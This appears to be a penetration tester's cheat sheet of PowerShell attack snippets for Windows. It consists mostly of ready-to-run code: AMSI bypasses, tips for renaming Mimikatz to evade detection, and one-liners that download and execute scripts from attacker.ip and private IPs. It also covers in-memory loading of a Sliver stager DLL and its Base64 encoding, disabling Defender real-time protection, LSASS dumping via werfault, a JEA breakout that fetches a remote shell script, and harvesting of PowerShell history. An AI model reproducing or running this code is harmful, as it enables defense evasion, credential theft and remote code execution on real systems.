
- Bypass AMSI with powershell (*Note* probably Win10 only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

- Win10 Bypass AMSI through amsiInitFailed (does not work on Win11 as far as I can tell)
	- Error on Win11 `MethodInvocationException: Exception calling "SetValue" with "2" argument(s): "Cannot set initonly static field 's_amsiInitFailed' after type 'System.Management.Automation.AmsiUtils' is initialized."`
	- TODO: research this more
```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
$g=$f.SetValue($null,$true)
```


### Bypassing AMSI to execute malicious scripts 

- ASMI Bypass Powershell code with inspiration from (https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)
	- use ASBB.ps1 as a base
	- If downloading scripts that will be flagged by AMSI, rename them
	- add download code for these scripts at the end of ASBB.ps1
	- example for `Invoke-Mimikatz.ps1` which is renamed to `IM.ps1`
```powershell
(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/IM.ps1') | IEX
```

- Download example
```powershell
iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/ASBB.ps1')”
```

- Tamper Protection status:
	- If the output is `False`, Tamper Protection is enabled.
	-  If the output is `True`, Tamper Protection is disabled.
```powershell
(Get-MpPreference).DisableTamperProtection
```

- Disable Defender if Tamper Protection is off
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
```

- Download and execute Powershell script

```powershell
 iex (New-Object Net.WebClient).DownloadString('http://ipaddress/script.ps1')
```

```powershell
Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://ipaddress/script.ps1').Content
```

- View Applocker Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Users

- Who is logged in?
```powershell
Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName
```


### Execute in memory

- Download and execute a dll
```powershell
$assembly = [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.197:8000/SliverStagerDll.dll')); $class = $assembly.GetType('GoodShip.GoodShip'); $method = $class.GetMethod('LoadStager'); $method.Invoke($null, $null)
```


## Powershell Base64 Conversion

```powershell
$script = @"
\$webClient = New-Object System.Net.WebClient
\$dllBytes = \$webClient.DownloadData('http://192.168.45.197:8000/SliverStagerDll.dll')
\$assembly = [System.Reflection.Assembly]::Load(\$dllBytes)
\$goodShipType = \$assembly.GetType('GoodShip.GoodShip')
\$loadStagerMethod = \$goodShipType.GetMethod('LoadStager')
\$loadStagerMethod.Invoke(\$null, \$null)
"@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encodedScript = [Convert]::ToBase64String($bytes)
$encodedScript
```


## Dump a process

```powershell
# Get process by name or PID
$process = Get-Process -Name "notepad"

# Create a dump using task manager
Start-Process taskmgr.exe /PID $process.Id /DumpFile C:\dumps\processdump.dmp

```


### Dumping LSASS using werfault

```powershell
$lsass = Get-Process -Name lsass
$dumpPath = "C:\dumps\lsass.dmp"
Start-Process -FilePath "werfault.exe" -ArgumentList "/dump $($lsass.Id) $dumpPath"
```


## No-Language Mode Breakout (JEA)

```powershell
&{IEX(New-Object Net.WebClient).downloadString('http://192.168.45.159:8000/ps/shell.ps1')}
```

### Search for Powershell Command History for
```powershell
Get-ChildItem "C:\Users" -Directory | ForEach-Object { $h = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if (Test-Path $h) { Get-Content $h | ForEach-Object { "$($_.Name): $_" } } }

```